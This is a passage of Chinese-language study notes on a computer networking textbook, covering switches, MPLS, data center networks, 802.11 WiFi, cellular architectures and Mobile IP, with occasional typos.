class="line-numbers-rows"><span></span></span></code></pre><ul><li>表中没有对于A的表项。在这种情况下，交换机向除接口x外的所有接口前面的输出缓存转发该帧的副本。换言之，如果没有对于目的地址的表项，交换机广播该帧。</li><li>表中有一个表项将A与接口x联系起来。在这种情况下，该帧从包括适配器A的局域网网段到来。无须将该帧转发到任何其他接口，交换机将通过丢弃该帧执行过滤功能即可。</li><li>表中有一个表项将A与接口y ≠ x联系起来。在这种情况下，该帧需要被转发到与接口y相连的局域网网段。交换机通过将该帧放到接口y前面的输出缓存完成转发功能。</li></ul><h4 id="自学习"><a href="#自学习" class="headerlink" title="自学习"></a>自学习</h4><p>交换机的表是自动、动态和自治地建立的，即没有来自网络管理员或来自配置协议的任何干预。即交换机的<code>自学习</code>的。这种能力是以如下方式实现的：<br>交换机表初始为空。</p><ul><li>对于在每个接口接受到的每个入帧，该交换机在其表中存储：在该帧源地址字段中的MAC地址；该帧到达的接口；当前时间。交换机以这种方式在它的表中记录了发送节点所在的局域网网段。</li><li>如果在一段时间（称为老化期）后，交换机没有接收到以该地址作为源地址的帧，就在表中删除这个地址。</li></ul><h4 id="交换机的性质"><a href="#交换机的性质" class="headerlink" title="交换机的性质"></a>交换机的性质</h4><ol><li><strong>消除碰撞。</strong> 在使用交换机构建的局域网中，没有因碰撞而浪费的贷款。交换机缓存帧并且决定不会在网段上同时传输多余一个帧。因此，交换机提供了比使用广播链路的局域网高得多的性能改善。</li><li><strong>异质的链路。</strong> 交换机将链路彼此隔离，因此局域网中的不同链路能够以不同的速率并且能够在不同的媒体上运行。因此，对于原有的设备与新设备混用，交换机是理想的。</li><li><strong>管理。</strong> 除了提供强化的安全性，交换机也易于进行网络管理。</li></ol><h4 id="交换机和路由器比较"><a href="#交换机和路由器比较" class="headerlink" title="交换机和路由器比较"></a>交换机和路由器比较</h4><p>1.交换机是即插即用的；交换机能够具有相对高的分组过滤和转发速率；交换机必须处理高至第二层的帧，而路由器必须处理高至第三层的数据报；为了防止广播帧的循环，交换网络的活跃拓扑限制为一颗生成树。另外，一个大型交换网络将要求在主机和路由器中有大量的ARP表，这将生成客观的ARP流量和处理量。而且，交换机对于广播风暴并不提供任何保护措施。</p><p>2.因为网络殉职通常是分层次的，即使当网络中存在冗余路径时，分组通常也不会通过路由器循环。所以，分组不会被限制到一颗生成树上，并可以使用源和目的地之间的最佳路径。路由器对第二层的广播风暴提供了防火墙保护。路由器不是即插即用的，即路由器和连接到它们的主机都需要人为地配置IP地址。而且路由器对每个分组的处理时间通常比交换机更长，因为它们必须处理高达第三层的字段。</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172210459.png"></p><h3 id="虚拟局域网"><a href="#虚拟局域网" class="headerlink" title="虚拟局域网"></a>虚拟局域网</h3><p>现代机构的局域网配置为等级结构的，每个工作组都有自己的交换局域网，经过一个交换机等级与其他工作组交换局域网互联</p><p>三个缺点：</p><p>1.缺乏流量隔离</p><p>2.交换机的无效使用</p><p>3.管理用户</p><p><strong>可以用通过支持虚拟局域网（VLAN）的交换机来处理</strong></p><h2 id="链路虚拟化-网络作为链路层"><a href="#链路虚拟化-网络作为链路层" class="headerlink" title="链路虚拟化:网络作为链路层"></a>链路虚拟化:网络作为链路层</h2><h4 id="多协议标签交换（MPLS）"><a href="#多协议标签交换（MPLS）" class="headerlink" title="多协议标签交换（MPLS）"></a>多协议标签交换（MPLS）</h4><p>1.<code>多协议标签交换（Multiprotocol Label Switching, MPLS）</code>采用来自虚电路网络领域的一个关键概念：固定长度标签。其目标是：对于基于固定长度标签和虚电路的技术，在不放弃基于目的地IP数据报转发的基础设施的前提下，当可能时通过选择性地标识数据报并允许路由器基于固定长度的标签转发数据报来增强其功能。</p><p>2.在MPLS使能的路由器之间传输的一个链路层帧</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172231330.png"></p><p>包括在MPLS首部中的字段是：</p><p>标签；</p><p>预留的3比特实验字段；</p><p>1比特S字段，用于指示一系列“成栈”的MPLS首部的结束；</p><p>寿命字段</p><p>3.一个MPLS加强的帧仅能在两个均为MPLS使能的路由器之间发送。一个MPLS使能的路由器常被称为标签交换路由器，因为它通过在其转发表中查找MPLS标签，然后立即将数据报传递给适当的输出接口来转发MPLS帧。因此，MPLS使能的路由器不需要提取目的IP地址和在转发表中执行最长前缀匹配的查找</p><p>4.MPLS能够并且已经被用于实现所谓虚拟专用网（Virtual Private Network, VPN）</p><h2 id="数据中心网络"><a href="#数据中心网络" class="headerlink" title="数据中心网络"></a>数据中心网络</h2><p>1.每个数据中心都有自己的数据中心网络，这些数据中心网络将其内部主机彼此互联并与因特网中的数据中心互联。数据中心中的主机称为<code>刀片</code>，一般是包括CPU、内存和磁盘存储的商用主机。主机被堆迭在机架上，每个机架一般堆放20~40台刀片。在每一个机架顶部有一台交换机，这台交换机形象地被称为机架<code>顶部（Top of Rank, TOR）交换机</code>，它们与机架上的主机互联，并与数据中心中的其他交换机互联。具体来说，机架上的每台主机都有一块与TOR交换机连接的网卡，每台TOR交换机有额外的端口能够与其他TOR交换机连接。</p><p>2.数据中心网络支持两种类型的流量：在外部客户与内部主机之间流动的流量，以及内部主机之间流动的流量。为了处理外部客户与内部主机之间流动的流量，数据中心网络包括了一台或者多台<code>边界路由器</code>，它们将数据中心网络与公共因特网相连。数据中心网络因此需要将所有机架彼此互联，并将机架与边界路由器连接。</p><p>3.在数据中心内部，外部请求首先被定向到一个<code>负载均衡器</code>。负载均衡器的任务是向主机分发请求，以主机当前的负载作为函数来在主机之间均衡负载。一个大型数据中心通常会有几台负载均衡器，每台服务于一组特定的云引用。由于负载均衡器基于分组的目的端口号以及目的的IP地址做决策，因此它们常被称为“第四层交换机”。一旦接收到一个对于特定应用程序的请求，负载均衡器将该请求分发到处理该应用的某一台主机上。当主机处理完该请求后，向负载均衡器回送响应，再由负载均衡器将其中继发回给外部客户。负载均衡器不仅彭亨主机间的工作负载，而且还提供类似NAT的功能，将外部IP地址转换为内部适当主机的IP地址，然后将反方向流向客户的分组按照相反的转换进行处理。这防止客户直接接触主机，从而具有隐藏网络内部结构和防止客户直接与主机交互等安全益处。</p><p>4.数据中心网络的两个设计趋势是<code>全连接拓扑</code>和<code>模块化数据中心</code>。</p><h2 id="七、无线网络和移动网络"><a href="#七、无线网络和移动网络" class="headerlink" title="七、无线网络和移动网络"></a>七、无线网络和移动网络</h2><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><ol><li><strong>基站</strong> 是无线网络基础设施的一个关键部分。基站在有线网络中没有明确的对应设备，它负责向与之关联的无线主机发送数据和从主机那里接收数据。基站通常负责协调与之相关联的多个无线主机的传输。当一台无线主机与某基站“相关联”时，表示该主机位于该基站的无线通信范围内；该主机使用该基站中继它和更大网络之间的数据。蜂窝网络中的 <code>蜂窝塔</code> 和802.11无线LAN中的 <code>接入点</code> 都属于基站。</li></ol><p>2.可以根据两个准则来对无线网络分类：</p><p>①在该无线网络中的分组是否跨越了一个无线跳或多个无线跳；</p><p>②网络中是否有诸如基站这样的基础设施。</p><ul><li>单跳，基于基础设施。 这些网络具有与较大的有线网络连接的基站。此外，该基站与无线主机之间的所有通信都经过一个无线跳。在教室、咖啡屋或图书馆中使用的802.11网络以及4G LTE数据网络都属于这种类型。</li><li>单跳，无基础设施。 在这些网络中，不存在与无线网络相连的基站。在这种单跳网络中的一个节点可以协调其他节点的传输。蓝牙网络和具有自组织模式的802.11网络属于这种类型。</li><li>多跳，基于基础设施。 在这些网络中，一个基站表现为以有线方式与较大网络相连。然而，某种无线节点为了经该基站通信，可能不得不通过其他无线节点中继它们的通信。某些无线传感网络和所谓的无线网状网络就属于这种类型。</li><li>多跳。无基础设施。 在这些网络中没有基站，并且节点为了到达目的地可能必须在几个其他无线节点之间中继报文。节点也可能是移动的，在多个节点中改变连接关系，一类网络被称为移动自组织网络（mobile ad hoc network, MANET）。如果该移动节点是车载的，该网络是车载自组织网络（vehicular ad hoc network, VANET）。</li></ul><h2 id="无线链路和网络特征"><a href="#无线链路和网络特征" class="headerlink" title="无线链路和网络特征"></a>无线链路和网络特征</h2><h4 id="无线链路和有线链路间重要的区别"><a href="#无线链路和有线链路间重要的区别" class="headerlink" title="无线链路和有线链路间重要的区别"></a>无线链路和有线链路间重要的区别</h4><ol><li><strong>递减的信号强度。</strong> 电磁波在穿过物体时强度将减弱。即使在自由空间中，信号仍将扩散，这使得信号强度随着发送方和接收方距离的增加而减弱（有时称其为路径损耗）。</li><li><strong>来自其他源的干扰。</strong> 在同一个频段发送信号的电波源将相互干扰。除了来自发送源的干扰，环境中的电磁噪声也能形成干扰。</li><li><strong>多径传播。</strong> 当电磁波的一部分受物体和地面反射，在发送方和接收方之间走了不同长度的路径，则会出现多径传播。这使得接收方收到的信号变得模糊。位于发送方和接收方之间的移动物体可导致多径传播随时间而改变。</li></ol><h4 id="信噪比（Signal-to-Noise-Ratio-SNR）"><a href="#信噪比（Signal-to-Noise-Ratio-SNR）" class="headerlink" title="信噪比（Signal-to-Noise Ratio, SNR）"></a>信噪比（Signal-to-Noise Ratio, SNR）</h4><p><strong>信噪比</strong> 是所受到的信号和噪声强度的相对测量。SNR的度量单位通常是分贝（dB）。以dB度量的SNR是这个比值的20倍，即接收到的信号的振幅与噪声的振幅的以10为底的对数的比值。比特差错率（BER）是在接收方收到的有错传输比特的概率。</p><p>1.对于给定的调制方案，SNR越高，BER越低。由于发送方通过增加它的传输功率就能够增加SNR，因此发送方能够通过增加它的传输功率来降低接收到差错帧的概率。然而，增加传输功率也会伴随着一些缺点：发送方必须消耗更多的能量，并且发送方的传输更可能干扰另一个发送方的传输。</p><p>2.对于给定的SNR，具有较高比特传输率的调制技术将具有较高的BER。</p><p>3.物理层调制技术的动态选择能用于适配对信道条件的调制技术。</p><h4 id="CMDA"><a href="#CMDA" class="headerlink" title="CMDA"></a>CMDA</h4><p>这个信号的变化速率（称为码片速率）比初始数据比特序列的变化速率快得多。假设初始数据比特到达CDMA编码其的速率定义了时间单元；也就是说，每个要发送的初始数据比特需要1比特时隙时间。</p><p>设di为第i个比特时隙中的数据比特值。为计算便利，把具有0值的数据比特表示为-1。每个比特时隙又进一步细分为M个微时隙。发送方使用的CDMA编码由M个值的一个序列cm组成，m = 1, …, M，每个取值为+1或-1。</p><p>对于第i个数据比特di。对于di比特传输时间的第m个微时隙，CDMA编码器的输出Zi,m是di乘以分配的CDMA编码的第m比特cm</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172347374.png"></p><p>对没有干扰的发送方，接收方将收到编码的比特Zi,m，并且恢复初始的数据比特di，计算如下：</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172357268.png"></p><p>然而，实际上的CDMA必须在存在干扰发送方的情况下工作，这些发送方用分配的不同编码来编码和传输它们的数据。但是当一个发送方的数据比特和其他发送方发送的比特混在一起时，CDMA发送方就需要其他的方法来恢复该发送方的初始数据比特。</p><p>CDMA的工作有一种假设，即对干扰的传输比特信号是加性的，这意味着，例如在同一个微时隙中，如果3个发送段都发送1，第4个发送端发送-1，那么在那个微时隙中所有的接收方接收的信号都是2。在存在多个发送方时，发送方s计算它编码后的传输计算方式与上面完全相同</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172409781.png"></p><p>然而在第i个比特时隙的第m个微时隙期间，接收方现在收到的值是那个微时隙中从所有N个发送方传输的比特总和：</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172429143.png" alt="image-20250920172429143"></p><p>如果仔细地选择发送方的编码，每个接收方只通过式*中的同样方式使用发送方的编码，就能从聚合的信号中恢复一个给定的发送方发送的数据：</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172439656.png"></p><h2 id="Wife-802-11和无线Lan"><a href="#Wife-802-11和无线Lan" class="headerlink" title="Wife:802.11和无线Lan"></a>Wife:802.11和无线Lan</h2><p>IEEE 802.11 无限LAN，也成为wife</p><h3 id="802-11结构体系"><a href="#802-11结构体系" class="headerlink" title="802.11结构体系"></a>802.11结构体系</h3><p>1.802.11体系结构的基本构建模块是<code>基本服务集（Basic Service Set, BSS）</code>。一个BSS包含一个或多个无线站点和一个在802.11术语中成为<code>接入点（Access Point, AP）</code>的中央基站。</p><p>2.配置AP的无线LAN经常被称作基础设施无线LAN，其中的“基础设施”是指AP联通互联AP和一台路由器的有线以太网</p><h4 id="信道与关联"><a href="#信道与关联" class="headerlink" title="信道与关联"></a>信道与关联</h4><p>1.当网络管理员安装一个AP时，管理员为该接入点分配一个单字或双字的<code>服务器集标识符（Service Set Identifier, SSID）</code>。管理员还必须为该AP分配一个信道号。在802.11运行的85MHz的频段内，802.11定义了11个部分重迭的信道。当且仅当两个信道由4个或更多信道隔开时它们才无重迭。特别是信道1、6和11的集合是唯一的3个非重迭信道的集合。</p><p>2.<code>WiFi丛林</code>是一个任意物理位置，在这里无线站点能从两个或多个AP中收到很强的信号。为了获得因特网的接入，无线站点需要加入其中一个子网并因此需要与与其中的一个AP相<code>关联</code>。关联意味着这一无线站点在自身和该AP之间船舰一个虚拟线路。特别是，仅有关联的AP才向无线站点发送数据帧，并且该无线站点也仅仅通过该关联AP向因特网发送数据帧。</p><p>3.802.11标准要求每个AP周期性地发送<code>信标帧</code>，每个信标帧包括该AP的SSID和MAC地址。无线站点为了得知正在发送信标帧的AP，扫描11个信道，找出来自可能位于该区域的AP所发送的信标帧。通过信标帧了解到可用AP后，无线站点选择一个AP用于关联。</p><p>4.扫描信道和监听信标帧的过程被称为<code>被动扫描</code>。无线主机也能够执行<code>主动扫描</code>，这是通过向位于无线主机范围内的所有AP广播探测帧完成的。AP用一个探测响应帧应答探测请求帧。无线主机则能够在响应的AP中选择某AP与之相关联。选定与之相关联的AP后，无线主机向AP发送一个关联请求帧，并且该AP以一个关联响应帧进行响应。注意到对于主动扫描需要这种第二次请求/响应握手，因为一个对初始探测请求帧进行响应的AP并不知道主机选择哪个响应的AP进行关联。一旦与一个AP关联，该主机希望加入该AP所属的子网中。因此，该主机通常将通过关联的AP向该子网发送一个DHCP发现报文，以获取在该AP子网中的一个IP地址。一旦获得地址，网络的其他部分将直接视该主机为该子网中的另一台主机。</p><h3 id="802-11-MAC协议"><a href="#802-11-MAC协议" class="headerlink" title="802.11 MAC协议"></a>802.11 MAC协议</h3><p>802.11的设计者为802.11无线LAN选择了一种随机访问协议。这个随机访问协议称作带碰撞避免的CSMA（CSMA/CA）。尽管以太网和802.11都使用载波侦听随机接入，但这两种MAC协议有着重要的区别。首先，802.11使用碰撞避免而非碰撞检测。其次，由于无线信道相对较高的比特率，802.11使用链路层确认/重传方案</p><pre class="line-numbers language-none"><code class="language-none">802.11 MAC协议并未实现碰撞检测的原因：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>检测碰撞的能力要求站点具有同时发送和接收的能力。因为在802.11适配器上，接收信号的强度通常远远小于发送信号的强度，制造具有检测碰撞能力的硬件代价较大。</li><li>即使适配器可以同时发送和监听信号，适配器也会由于隐藏终端问题和衰减问题而无法检测到所有的碰撞。</li></ul><p>当无线LAN中某站点发送一个帧时，该帧会由于多种原因不能无损地到达目的站点。为了处理这种不可忽视的故障情况，802.11 MAC使用链路层确认。目的站点收到一个通过CRC校验的帧后，它等待一个被称作<code>短帧时间间隔（Short Inter-Frame Spacing, SIFS）</code>的一小段时间，然后发回一个确认帧，如果发送站点在给定的时间内未收到确认帧，它假定出现了错误并重传该帧，使用CSMA/CA协议访问该信道。如果在若干固定次重传后仍未收到确认，发送站点将放弃发送并丢弃该帧。</p><p><code>10.802.11的CSMA/CA协议的内容：</code><br>假设一个站点有一个帧要发送。</p><ul><li>如果某站带你最初监听到某信道空闲，它将在一个被称作分布式帧间间隔（Distributed Inter-Frame Space, DIFS）的短时间段后发送该帧。</li><li>否则，该站点选取一个随机回退值并且在侦听信道空闲时递减该值。当侦听到信道忙时，计数值保持不变。</li><li>当计数值减为0时，该站点发送整个数据帧并等待确认。</li><li>如果收到确认，发送站站点知道它的帧以被目的站正确接收了。如果该站点要发送另一帧，它将从第二步开始CSMA/CA协议。如果未收到确认，发送站点将重新进入第二步中的回退阶段，并从一个更大范围内选取随机值。</li></ul><h4 id="处理隐藏终端-RTS和CTS"><a href="#处理隐藏终端-RTS和CTS" class="headerlink" title="处理隐藏终端:RTS和CTS"></a>处理隐藏终端:RTS和CTS</h4><p>为了避免隐藏终端导致的碰撞，IEEE 802.11协议允许站点使用一个短<code>请求发送（Request to Send, RTS）</code>控制帧和一个短<code>允许发送（Clear to Send, CTS）</code>控制帧来预约对信道的访问。当发送方要发送一个DATA帧时，它能够首先向AP发送一个RTS帧，只是传输DATA帧和确认帧需要的总时间。当AP收到RTS帧后，它广播一个CTS帧作为响应。该CTS帧有两个目的：给发送方明确的发送许可，也指示其他站点在预约其内不要发送。RTS和CTS帧的使用能够在两个重要方面提高性能：</p><ul><li>隐藏终端问题被缓解了，因为长DATA帧只有在信道预约后才被传输。</li><li>因为RTS和CTS帧较短，涉及RTS和CTS帧的碰撞将仅持续短RTS和CTS帧的持续期。一旦RTS和CTS帧被正确传输，后续的DATA和ACK帧应当能无碰撞地发送。</li></ul><p>尽管RTS/CTS交换有助于降低碰撞，但它同样引入了时延以及小号了信道资源。因此，RTS/CTS交换仅仅用于长数据帧预约信道。在实际中，每个无线站点可以设置一个RTS门限值，仅当帧长超过门限值时，才使用RTS/CTS序列。</p><h3 id="IEEE-802-11帧"><a href="#IEEE-802-11帧" class="headerlink" title="IEEE 802.11帧"></a>IEEE 802.11帧</h3><h4 id="有效载荷与CRC字段"><a href="#有效载荷与CRC字段" class="headerlink" title="有效载荷与CRC字段"></a>有效载荷与CRC字段</h4><p>帧的核心是有效载荷，它通产是由一个IP数据报或者ARP分组组成。尽管这一字段允许的最大长度为2312字节，但它通常小于1500字节，放置一个IP数据报或一个ARP分组。如同以太网帧一样，802.11包括一个CRC码，从而接收方可以检测所收到帧中的比特错误。比特错误在无线局域网中比在有线局域网中更加普遍，因此CRC在这里更加有用。</p><h4 id="地址字段"><a href="#地址字段" class="headerlink" title="地址字段"></a>地址字段</h4><p>802.11帧具有4个地址字段，其中每个都可以包含一个6字节的MAC地址。地址2是传输该帧的站点的MAC地址。地址1是要接收该帧的无线站点的MAC地址。BSS是一个子网的一部分，并且这个子网经一些路由器接口与其他子网相连，地址3包含这个路由器接口的MAC地址。</p><h4 id="序号、持续期和帧控制字段"><a href="#序号、持续期和帧控制字段" class="headerlink" title="序号、持续期和帧控制字段"></a>序号、持续期和帧控制字段</h4><p>在802.11网络中，无论何时一个站点正确地收到一个来自其他站点的帧，它就回发一个确认。因为确认可能会丢失，发送站点可能会发送一个给定帧的多个副本。使用序号可以使接收方区分新传输的帧和以前的帧的重传。802.11协议允许传输节点预约信道一段时间，包括传输其数据帧的时间和传输确认的时间，这个持续期值被包括在该帧的持续期字段中。控制字段包括许多子字段，比较重要的是，类型和子类型字段用于区分关联、RTS、CTS、ACK和数据帧。到和从字段用于定义不同地址字段的含义。WEP字段指示了是否使用加密</p><h3 id="在相同的IP子网中的移动性"><a href="#在相同的IP子网中的移动性" class="headerlink" title="在相同的IP子网中的移动性"></a>在相同的IP子网中的移动性</h3><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172510538.png"></p><h3 id="802-11-中的高级特色"><a href="#802-11-中的高级特色" class="headerlink" title="802.11 中的高级特色"></a>802.11 中的高级特色</h3><h4 id="效率适应"><a href="#效率适应" class="headerlink" title="效率适应"></a>效率适应</h4><p>802.11实现具有一种速率自适应能力，该能力自适应地根据当前和近期信道特点来选择下面的物理层调职技术。如果一个节点连续发送两个帧而没有收到确认，该传输速率降低到前一个较低的速率。如果10个帧连续得到确认，或如果用来跟踪自上次降速以来时间的定时器超时，该传输速率提高到上一个较高的速率。</p><h4 id="功率管理"><a href="#功率管理" class="headerlink" title="功率管理"></a>功率管理</h4><p>802.11标准提供了功率管理能力，以使802.11节点的侦听、传输和接收功能以及其他需要“打开”电路的时间最小化。802.11功率管理按下列方式运行。一个节点能够明显地在睡眠和唤醒状态之间交替。通过将802.11帧首部的功率管理比特设置为1，某节点向接入点指示它将打算睡眠。设置节点中的一个定时器，使得正好在AP计划发送它的信标帧前唤醒节点。因为AP从设置的功率传输比特知道哪个节点打算睡眠，所以该AP知道它不应当向这个节点发送任何帧，先缓存目的地为睡眠主机的任何帧，待以后再传输。</p><h3 id="个人域网络-蓝牙和ZigBee"><a href="#个人域网络-蓝牙和ZigBee" class="headerlink" title="个人域网络:蓝牙和ZigBee"></a>个人域网络:蓝牙和ZigBee</h3><h4 id="蓝牙"><a href="#蓝牙" class="headerlink" title="蓝牙"></a>蓝牙</h4><p>IEEE 802.15.1网络以低功率和低成本在小范围内运行。它本质上是一个低功率、小范围、低速率的“电缆替代”技术，用于计算机与其无线键盘、鼠标或其他外部设备的互联。802.15.1网络有时被称为无线个人网络（Wireless Personal Area Network, WPAN）。802.15.1的链路层和物理层基于早期用于个人域网络的蓝牙规范。</p><h4 id="ZigBee"><a href="#ZigBee" class="headerlink" title="ZigBee"></a>ZigBee</h4><p>IEEE标准化的第二个个人域网络是802.14.5，它被称为ZigBee，其服务目标是低功率、低数据率、低工作周期的应用。ZigBee定义了20kbps、40kbps、100kbps和250kbps的信道速率，这取决于信道的频率。</p><h2 id="蜂窝因特网的接入"><a href="#蜂窝因特网的接入" class="headerlink" title="蜂窝因特网的接入"></a>蜂窝因特网的接入</h2><p>1.蜂窝是指这样的事实，即由一个蜂窝网覆盖的区域被分成许多称作<code>小区</code>的地理覆盖区域。每个小于包含一个<code>收发基站（Base Transceiver Station, BTS）</code>，负责向位于其小区内的移动站点发送或接收信号。一个小区的覆盖区域取决于许多因素，包括BTS的发射功率、用户设备的传输功率、小区中的障碍建筑物以及基站天线的高度。</p><p>2.2G蜂窝系统的<code>全球移动通信系统（GSM）</code>标准对空中接口使用了组合的FDM/TDM。在组合的FDM/TDM系统中，信道被划分为若干频率子带；对于每个子带，时间又被划分为帧和时隙。因此，对于一个组合的FDM/TDM系统，如果信道被划分为F个子带，并且时间被划分为T个时隙，那么该信道将能够支持FT个并发的呼叫。</p><p>3.一个GSM网络的<code>基站控制器（Base Station Controller, BSC）</code>通常服务于几十个收发基站。BSC的责任是为移动用户分配BTS无线信道，执行寻呼，执行移动用户的切换。基站控制器及其控制的收发基站共同构成了<code>GSM基站系统（Base Station System, BSS）</code>。</p><p>4.在用户鉴别和账户管理中以及呼叫建立和切换中，<code>移动交换中心（Mobile sWitching Center, MSC）</code>起着决定性的租用。单个MSC通常包含多达5个BSC，因此每个MSC有大约200 000个用户。一个蜂窝提供商的网络将有若干MSC，使用称为网关MSC的特殊MSC将提供商的蜂窝网络于更大的公共电话网相连。</p><p>5.在3G核心网中有两类节点：<code>服务通用分组无线服务支持节点（Serving Generalized packet radio service Support Node, SGSN）和网关GPRS支持节点（Gateway GPRS Support Node, GGSN）</code>。SGSN负责向位于其连接的无线电接入网中的移动节点交付数据报。SGSM于该区域蜂窝语音网的MSC进行交互，提供用户认证和切换，维护活跃移动节点的位置信息，执行位于无线接入网中的移动节点和GGSN之间的数据报转发。GGSN起着网关的作用，将多个SGSN连接到更大的因特网。GGSN因此是源于移动节点的一个数据报在进入更大因特网之前遇到的3G基础设施的最后一部分。</p><p>6.4G系统体系结构中：</p><ul><li>eNode是2G基站和3G无线电网络控制器的逻辑后代，并且此时还起这关键作用。它的数据报平面作用是在UE和P-GW之间（经过LTE无线电接入网）转发数据报。UE数据报在eNodeB被封装，并且通过4G网络的全IP强化分组核（EPC）以隧道形式传输到P-GW。这些隧道可能于保证服务质量（QoS）相关。</li><li>分组数据网络网关（Packet Data Network Gateway, P-GW）给UE分配IP地址，并且保证QoS实施。作为隧道端点，当向或从UE转发数据报时，它也执行数据报封装/解封装。</li><li>服务网关（S-GW）是数据平面移动性锚点，即所有UE流量将通过S-GW传递。该S-GW也执行收费/记账功能以及法定的流量拦截。</li><li>移动性管理实体（Mobility Management Entity, MME）代表位于它所控制单元中的UE，执行连接和移动性管理。它从HHS接收UE订购信息。</li><li>归属用户服务（Home Subscriber Server, HSS）包含了包括漫游接入能力、服务质量配置文件和鉴别信息的UE信息。</li></ul><p>7.LTE在下行信道采用频分复用和时分复用结合的方法，称之为正交频分复用（Orthogonal Frequency Division Multiplexing, OFDM）技术。</p><h2 id="移动管理"><a href="#移动管理" class="headerlink" title="移动管理"></a>移动管理</h2><p>在一个网络环境中，一个移动节点的永久居所被称为归属网络，在归属网络中代表移动节点执行移动挂历功能的实体叫归属代理。移动节点当前所在的网络叫作外部网络或被访网络，在外部网络中帮助移动节点做移动管理功能的实体称为外部代理。通信者就是希望与该移动节点通信的实体。</p><h3 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h3><p>外部代理的作用之一是为移动节点创建一个所谓的<code>转交地址（Care-Of Address, COA）</code>，该COA的网络部分与外部网络的网络部分相匹配。因此一个移动节点可与两个地址相关联，即其<code>永久地址</code>与其COA，该COA有时又称为<code>外部地址</code>。外部代理的第二个作用是告诉归属代理，该移动节点在它的网络中且具有给定的COA。</p><h4 id="两种方法"><a href="#两种方法" class="headerlink" title="两种方法"></a>两种方法</h4><p><code>间接路由选择方法。</code>通信者指示将数据报寻址到移动节点的固定地址，并将数据报发送到网络中去，完全不知道移动节点是在归属网络中还是正在访问某个外部网络，因此移动性对于通信者来说是完全透明的。这些数据报就像平常一样首先导向移动节点的归属网络。</p><p>归属代理监视到达的数据报，这些数据报寻址的节点的归属网络与该归属代理所在网络相同，但这些节点当前却在某个外部网络中。归属代理截获这些数据报，然后转发它们。通过使用移动节点的COA，该数据报先转发给外部代理，然后再从外部代理转发给移动节点。</p><p>归属代理将通信者的原始完整数据报封装在一个新的较大的数据报中，这个较大的数据报被导向并交付到移动节点的COA。“拥有”该COA的外部代理将接收并拆封该数据报，即从较大的封装数据报中取出通信者的原始数据报，然后再向移动节点转发该原始数据报。</p><p>移动节点向通信者发送数据报时，只要直接将其数据报寻址到通信者（使用自己的永久地址作为源地址，通信者的地址作为目的地址）即可。</p><p> 间接路由选择方法存在一个低效的问题，即三角路由选择问题。该问题是指即使在通信者与移动节点之间存在一条更有效的路由，发往移动节点的数据报也要先发给归属代理，然后再发送到外部网络。</p><p><code>直接路由选择</code>克服了路由选择的低效问题，但却是以增加复杂性为代价的。在直接路由选择方法中，通信者所在网络中的一个通信者代理先知道该移动节点的COA。这可以让通信者向归属代理询问得知，假设移动节点具有一个在归属代理注册过的最新的COA。通信者本身也可能执行通信者代理的功能。</p><h2 id="移动IP"><a href="#移动IP" class="headerlink" title="移动IP"></a>移动IP</h2><p>支持移动性的因特网体系结构与协议合起来称为移动IP。移动IP标准有三部分组成：</p><ul><li>代理发现。移动IP定义了一个归属代理或外部代理用来向移动节点通告其服务的协议，以及移动节点请求一个外部代理或归属代理的服务所使用的协议。</li><li>向归属代理注册。移动IP定义了移动节点和/或外部代理向一个移动节点归属代理注册或注销COA所使用的协议。</li><li>数据报的间接路由选择。该标准也定义了数据报被一个归属代理转发给移动节点的方式，包括转发数据报使用的规则、处理差错情况的规则和集中不同的封装形式。</li></ul><p>到达一个新网络的某移动IP节点，不管是连到一个外部网络还是返回其归属网络，它都必须知道响应的外部代理或归属代理的身份。这个过程被称为代理发现。代理发现可以通过下列两种方式之一实现：<code>代理通过或代理请求。</code></p><p>借助<code>代理通告</code>，外部代理或归属代理使用一种现有路由器发现协议的扩展新协议来通告其服务。该代理周期性地在所有连接的链路上广播一个类型字段为9的ICMP报文。路由器发现报文也包含路由器的IP地址，因此允许一个移动节点知道该代理的IP地址。路由器发